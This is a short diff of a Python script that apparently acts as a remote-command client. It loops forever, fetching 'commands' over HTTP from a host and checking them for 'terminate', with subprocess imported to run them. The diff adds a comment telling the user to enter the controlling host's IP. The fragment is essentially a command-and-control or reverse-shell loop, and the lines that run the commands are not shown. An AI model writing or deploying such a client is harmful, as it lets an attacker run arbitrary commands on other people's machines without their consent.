@@ -2,9 +2,8 @@ import requests
 import subprocess
 import time
 
-
 while True:
-    req=requests.get('http://127.0.0.1')
+    req=requests.get('http://127.0.0.1') #Enter host ip here
     command=req.text
 
     if 'terminate' in command:
